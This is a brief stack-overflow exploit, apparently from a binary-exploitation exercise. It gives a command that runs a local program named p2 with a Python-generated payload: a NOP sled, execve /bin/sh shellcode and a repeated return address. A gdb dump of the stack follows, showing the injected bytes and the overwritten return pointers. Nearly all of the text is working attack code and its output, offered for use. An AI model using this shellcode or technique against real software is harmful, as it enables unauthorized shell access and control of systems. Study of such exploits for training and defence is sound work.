./p2 $(python -c "print '\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'+'\xcc\xcb\xff\xff'*$27")

# (gdb) x/72xw $esp
# 0xffffcba0:	0xffffcbbc	0x08048690	0xf7fab000	0x0000ffd7
# 0xffffcbb0:	0xffffffff	0x0000002f	0xf7e05dc8	0x31909090
# 0xffffcbc0:	0x2f6850c0	0x6868732f	0x6e69622f	0x8950e389
# 0xffffcbd0:	0xe18953e2	0x80cd0bb0	0xffffcbcc	0xffffcbcc
# 0xffffcbe0:	0xffffcbcc	0xffffcbcc	0xffffcbcc	0xffffcbcc
# 0xffffcbf0:	0xffffcbcc	0x08048200	0x0804861b	0x00000000
# 0xffffcc00:	0xf7fab000	0xf7fab000	0x00000000	0xf7e11637
# 0xffffcc10:	0x00000002	0xffffcca4	0xffffccb0	0x00000000
# 0xffffcc20:	0x00000000	0x00000000	0xf7fab000	0xf7ffdc04
# 0xffffcc30:	0xf7ffd000	0x00000000	0xf7fab000	0xf7fab000
# 0xffffcc40:	0x00000000	0x2a669de0	0x17d553f0	0x00000000
# 0xffffcc50:	0x00000000	0x00000000	0x00000002	0x08048430
# 0xffffcc60:	0x00000000	0xf7fedf10	0xf7fe8780	0xf7ffd000
# 0xffffcc70:	0x00000002	0x08048430	0x00000000	0x08048451
# 0xffffcc80:	0x0804855e	0x00000002	0xffffcca4	0x08048610
# 0xffffcc90:	0x08048600	0xf7fe8780	0xffffcc9c	0xf7ffd918
# 0xffffcca0:	0x00000002	0xffffcebd	0xffffcedd	0x00000000
# 0xffffccb0:	0xffffcf16	0xffffcf21	0xffffcf33	0xffffcf49
# (gdb)
